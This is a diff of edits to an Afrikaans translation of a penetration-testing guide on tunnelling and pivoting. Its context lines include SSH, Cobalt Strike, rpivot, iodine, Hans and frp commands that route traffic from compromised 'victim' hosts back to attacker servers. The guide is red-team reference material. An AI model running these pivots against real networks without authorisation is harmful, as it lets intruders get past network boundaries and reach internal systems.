@@ -9,7 +9,7 @@
 
 ## **Bash**
 
-**Gasheer -> Spring -> InternA -> InternB**
+**Gastheer -> Spring -> InternA -> InternB**
 ```bash
 # On the jump server connect the port 3333 to the 5985
 mknod backpipe p;
@@ -33,7 +33,7 @@ ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
 ```
 ### Plaaslike Port2Port
 
-Maak nuwe poort in SSH-bediener --> Ander poort
+Maak nuwe Poort in SSH-bediener --> Ander poort
 ```bash
 ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
 ```
@@ -51,7 +51,7 @@ sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
 ```
 ### Port2hostnet (proxychains)
 
-Plaaslike Poort --> Gecompromitteerde gasheer (SSH) --> Enigiemand
+Plaaslike Poort --> Gecompromitteerde gasheer (SSH) --> Enige plek
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
@@ -89,7 +89,7 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 > [!NOTE]
 > **Sekuriteit – Terrapin Aanval (CVE-2023-48795)**
-> Die 2023 Terrapin afgraderingsaanval kan 'n man-in-the-middle toelaat om met die vroeë SSH handdruk te sjoemel en data in **enige oorgestuurde kanaal** ( `-L`, `-R`, `-D` ) in te spuit. Verseker dat beide kliënt en bediener gepatch is (**OpenSSH ≥ 9.6/LibreSSH 6.7**) of sluit die kwesbare `chacha20-poly1305@openssh.com` en `*-etm@openssh.com` algoritmes in `sshd_config`/`ssh_config` eksplisiet af voordat jy op SSH tonnels staatmaak.
+> Die 2023 Terrapin afgraderingsaanval kan 'n man-in-the-middle toelaat om met die vroeë SSH handdruk te sjoemel en data in **enige oorgestuurde kanaal** ( `-L`, `-R`, `-D` ) in te voeg. Verseker dat beide kliënt en bediener gepatch is (**OpenSSH ≥ 9.6/LibreSSH 6.7**) of sluit die kwesbare `chacha20-poly1305@openssh.com` en `*-etm@openssh.com` algoritmes in `sshd_config`/`ssh_config` eksplisiet af voordat jy op SSH tonnels staatmaak.
 
 ## SSHUTTLE
 
@@ -136,7 +136,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 ```
 ## Cobalt Strike
 
-### SOCKS proxy
+### SOCKS-proxy
 
 Maak 'n poort op die spanbediener oop wat op al die interfaces luister wat gebruik kan word om die **verkeer deur die beacon te lei**.
 ```bash
@@ -157,7 +157,7 @@ rportfwd stop [bind port]
 Om op te let:
 
 - Beacon se omgekeerde poort forwarding is ontwerp om **verkeer na die Spanbediener te tonnel, nie om tussen individuele masjiene te relay nie**.
-- Verkeer word **getonnel binne Beacon se C2 verkeer**, insluitend P2P skakels.
+- Verkeer is **getonneld binne Beacon se C2 verkeer**, insluitend P2P skakels.
 - **Admin regte is nie nodig** om omgekeerde poort forwards op hoë poorte te skep nie.
 
 ### rPort2Port plaaslik
@@ -250,7 +250,7 @@ attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
 ```
-Pivot deur **NTLM proxy**
+Draai deur **NTLM proxy**
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
 ```
@@ -379,7 +379,7 @@ In **Profile -> Proxification Rules** voeg die naam van die program wat geproxif
 ## NTLM proxy bypass
 
 Die voorheen genoemde hulpmiddel: **Rpivot**\
-**OpenVPN** kan dit ook omseil, deur hierdie opsies in die konfigurasie-lêer in te stel:
+**OpenVPN** kan dit ook omseil deur hierdie opsies in die konfigurasie-lêer in te stel:
 ```bash
 http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 ```
@@ -387,8 +387,8 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Dit verifieer teen 'n proxy en bind 'n poort plaaslik wat na die eksterne diens wat jy spesifiseer, deurgegee word. Dan kan jy die hulpmiddel van jou keuse deur hierdie poort gebruik.\
-Byvoorbeeld, dit stuur poort 443 deur.
+Dit verifieer teen 'n proxy en bind 'n poort plaaslik wat na die eksterne diens wat jy spesifiseer, voortgelei word. Dan kan jy die hulpmiddel van jou keuse deur hierdie poort gebruik.\
+Byvoorbeeld, dit lei poort 443 voort.
 ```
 Username Alice
 Password P@ssw0rd
@@ -415,7 +415,7 @@ attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
 #You can see the victim at 1.1.1.2
 ```
-Die tonnel sal baie stadig wees. Jy kan 'n gecomprimeerde SSH-verbinding deur hierdie tonnel skep deur te gebruik:
+Die tonnel sal baie stadig wees. U kan 'n gecomprimeerde SSH-verbinding deur hierdie tonnel skep deur gebruik te maak van:
 ```
 ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 ```
@@ -448,18 +448,18 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 
 Proxychains onderskep `gethostbyname` libc oproep en tonnels tcp DNS versoek deur die socks proxy. Deur **verstek** is die **DNS** bediener wat proxychains gebruik **4.2.2.2** (hardgecodeer). Om dit te verander, wysig die lêer: _/usr/lib/proxychains3/proxyresolv_ en verander die IP. As jy in 'n **Windows omgewing** is, kan jy die IP van die **domeinbeheerder** stel.
 
-## Tunnels in Go
+## Tonnels in Go
 
 [https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)
 
-## ICMP Tunneling
+## ICMP Toneling
 
 ### Hans
 
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-Root is nodig in beide stelsels om tun-adapters te skep en data tussen hulle te tonnel deur ICMP echo versoeke.
+Root is nodig in beide stelsels om tun adapters te skep en data tussen hulle te tonnel deur ICMP echo versoeke.
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -517,7 +517,7 @@ _Dit is ook moontlik om outentisering en TLS by te voeg, indien nodig._
 ```
 #### Sniffing HTTP calls
 
-_nuttig vir XSS, SSRF, SSTI ..._\
+_Nuttig vir XSS, SSRF, SSTI ..._\
 Direk vanaf stdout of in die HTTP-koppelvlak [http://127.0.0.1:4040](http://127.0.0.1:4000).
 
 #### Tunneling internal HTTP service
@@ -561,7 +561,7 @@ cloudflared tunnel --url http://localhost:8080
 cloudflared tunnel --url socks5://localhost:1080 --socks5
 # Now configure proxychains to use 127.0.0.1:1080
 ```
-### Volgehoude tonnels met DNS
+### Volhoubare tonnels met DNS
 ```bash
 cloudflared tunnel create mytunnel
 cloudflared tunnel route dns mytunnel internal.example.com
@@ -578,9 +578,9 @@ Omdat alle verkeer die die gasheer **uitgaand oor 443** verlaat, is Cloudflared 
 
 ## FRP (Fast Reverse Proxy)
 
-[`frp`](https://github.com/fatedier/frp) is 'n aktief-onderhoude Go omgekeerde-proxy wat **TCP, UDP, HTTP/S, SOCKS en P2P NAT-gat-punching** ondersteun. Begin met **v0.53.0 (Mei 2024)** kan dit as 'n **SSH Tunnel Gateway** optree, sodat 'n teiken gasheer 'n omgekeerde tonnel kan opstel met slegs die standaard OpenSSH-kliënt – geen ekstra binêre benodig nie.
+[`frp`](https://github.com/fatedier/frp) is 'n aktief-onderhoubare Go omgekeerde-proxy wat **TCP, UDP, HTTP/S, SOCKS en P2P NAT-gat-punching** ondersteun. Begin met **v0.53.0 (Mei 2024)** kan dit as 'n **SSH Tunnel Gateway** optree, sodat 'n teiken gasheer 'n omgekeerde tonnel kan opstel met slegs die standaard OpenSSH-kliënt – geen ekstra binêre benodig nie.
 
-### Klassieke omgekeerde TCP tonnel
+### Klassieke omgekeerde TCP-tonnel
 ```bash
 # Attacker / server
 ./frps -c frps.toml            # listens on 0.0.0.0:7000
